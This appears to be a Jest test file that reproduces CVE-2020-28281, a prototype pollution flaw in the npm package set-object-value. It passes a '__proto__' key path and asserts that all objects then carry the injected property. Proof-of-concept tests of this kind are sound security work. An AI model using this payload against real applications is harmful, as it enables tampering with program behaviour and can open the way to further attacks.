//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28281
test("prototype pollution in setObjectValue", () => {
  var setObjectValue = require("set-object-value");
  obj = {};

  expect({}.polluted).toBe(undefined);

  setObjectValue(obj, ["__proto__", "polluted"], "yes");
  expect({}.polluted).toBe("yes");
});
